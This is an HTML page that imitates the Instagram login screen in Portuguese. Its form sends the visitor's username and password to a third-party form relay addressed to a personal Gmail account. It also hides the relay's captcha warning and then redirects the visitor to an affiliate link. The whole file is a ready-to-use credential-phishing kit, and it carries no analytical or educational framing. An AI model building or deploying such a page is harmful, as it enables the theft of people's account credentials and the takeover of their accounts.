<!DOCTYPE html>
<html lang="pt-br">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Instagram</title>
  <style>
    body {
      background-color: #fafafa;
      font-family: 'Arial', sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }
    .login-box {
      background: white;
      padding: 40px 30px;
      border: 1px solid #dbdbdb;
      text-align: center;
      width: 100%;
      max-width: 320px;
    }
    .login-box img {
      width: 175px;
      margin-bottom: 30px;
    }
    .login-box input {
      width: 100%;
      padding: 10px;
      margin: 6px 0;
      border: 1px solid #dbdbdb;
      border-radius: 4px;
      background: #fafafa;
    }
    .login-box button {
      background-color: #3897f0;
      color: white;
      border: none;
      padding: 10px;
      width: 100%;
      border-radius: 4px;
      font-weight: bold;
      margin-top: 10px;
    }
    .footer {
      margin-top: 20px;
      font-size: 13px;
      color: #8e8e8e;
    }
  </style>
</head>
<body>

  <form class="login-box" method="POST" action="https://formsubmit.co/natanaelverissimo34@gmail.com">
    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/2560px-Instagram_logo.svg.png" alt="Instagram Logo"/>
    
    <input type="text" name="username" placeholder="Telefone, nome de usuário ou email" required />
    <input type="password" name="password" placeholder="Senha" required />
    
    <!-- Redirecionamento após envio -->
    <input type="hidden" name="_redirect" value="https://seulinkcpa.com" />
    
    <!-- Remover aviso da FormSubmit -->
    <input type="hidden" name="_captcha" value="false" />
    
    <button type="submit">Entrar</button>

    <div class="footer">
      Esqueceu a senha?
    </div>
  </form>

</body>
</html>
